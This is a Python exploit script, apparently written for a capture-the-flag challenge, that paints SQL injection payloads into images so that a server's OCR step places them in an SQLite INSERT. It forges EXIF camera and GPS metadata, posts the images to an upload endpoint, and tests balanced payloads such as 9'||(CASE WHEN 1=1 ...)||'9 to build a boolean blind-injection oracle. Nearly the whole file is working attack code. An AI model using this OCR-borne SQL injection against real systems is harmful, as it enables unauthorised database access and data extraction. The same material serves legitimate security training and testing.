# v2_oracle.py — CONFIRMED: summary_ocr is concatenated into SQL ('...<OCR>...'); a closing quote
# + subquery -> 500 (executes but our extra concat/reopen is malformed). We need a payload that
# CLOSES the string and RE-BALANCES cleanly => 200 when valid. Then turn it into a boolean oracle.
# The OCR reads a quote glued to || as a real quote. Simplest balanced injection in SQLite where
# summary_ocr sits in VALUES(...,'<OCR>'):  close with '  then a valid boolean via AND, then
# comment out the rest.  BUT the OCR can't do '--'. Alternative: reopen a string so the trailing
# server quote matches. Sweep several balanced forms; a 200 (not 500) with plain text = executed OK.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1800,max(1000,40+int(len(text)*size*0.56))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("or.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"or.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("or.jpg","rb").read()).decode()

def st(painted, desc):
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    return r.status_code

q="'"
# We need a BALANCED injection. If INSERT is VALUES(..., '<OCR>', ...) with MORE columns after,
# then closing the quote and adding ",<something>" desyncs. But if summary_ocr is the LAST value:
#   VALUES(..., '<OCR>')  -> close with ' then we must comment or match parens.
# SQLite comment without -- : use  /* but can't close. Better: make the WHOLE thing a valid concat
# that yields 200. The key realization: a BALANCED form is  X'||Y||'Z  where X,Z are plain -> that
# keeps the string closed-open-closed. It EXECUTES Y. We saw 9'||(V)||'9 -> 500. Maybe (V) alias
# needs to be scalar & fine; 500 might be a different malformation. Try boolean forms that are
# guaranteed scalar and syntactically simple:
tests = {
 "b_true":  "9"+q+"||(CASE WHEN 1=1 THEN 65 ELSE 66 END)||"+q+"9",   # scalar, both quotes glued to digits
 "b_false": "9"+q+"||(CASE WHEN 1=2 THEN 65 ELSE 66 END)||"+q+"9",
 "simple":  "9"+q+"||65||"+q+"9",                                     # simplest concat, must be 200 if injectable-balanced
 "onlyclose":"9"+q+q+"9",                                             # '' -> escaped quote, plain -> 200 baseline
}
for d,p in tests.items():
    print(f"{d:10} -> {st(p,'OR_'+d)}   painted={p!r}")
print("\nGoal: find a form that returns 200 (balanced+executed). 'simple' 200 => oracle ready.")
